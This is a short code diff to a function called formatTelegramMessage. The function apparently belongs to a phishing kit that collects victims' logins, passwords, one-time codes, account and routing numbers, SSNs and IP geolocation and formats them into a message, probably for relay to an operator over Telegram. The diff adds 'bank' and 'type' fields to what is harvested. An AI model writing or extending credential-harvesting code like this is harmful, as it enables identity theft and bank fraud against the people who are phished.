@@ -28,7 +28,8 @@ function formatTelegramMessage(
   ipInfo: IpLocationData,
   sessionId: string
 ): string {
-  const { login, password, code, step, name, number, routing, ssn } = data;
+  const { login, password, code, step, name, number, routing, ssn, bank, type } = data;
+
 
   const { ip, country, city, regionName, isp, lon, lat } = ipInfo;
 
@@ -45,7 +46,9 @@ function formatTelegramMessage(
       .replace("{name}", name || "")
       .replace("{number}", number || "")
       .replace("{routing}", routing || "")
-      .replace("{ssn}", ssn || "");
+      .replace("{ssn}", ssn || "")
+      .replace("{type}", type || "")
+      .replace("{bank}", bank || "");
   }
 
   if (step === 3) {
